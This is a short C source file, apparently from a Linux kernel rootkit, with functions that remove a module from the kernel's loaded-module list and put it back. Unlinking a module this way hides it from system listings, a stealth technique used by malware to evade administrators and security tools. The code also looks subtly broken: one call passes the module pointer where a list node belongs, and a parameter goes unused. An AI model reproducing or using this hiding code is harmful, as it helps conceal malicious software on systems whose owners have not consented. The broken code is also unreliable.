#include "hide.h"

/**
 * Add module into module_list
 */
void showme(struct list_head *prev){
    list_add(THIS_MODULE, prev);
}

/**
 * Hide a module from the loaded module list.
 */
void hideme(struct list_head *node){
    list_del(&THIS_MODULE->list);
}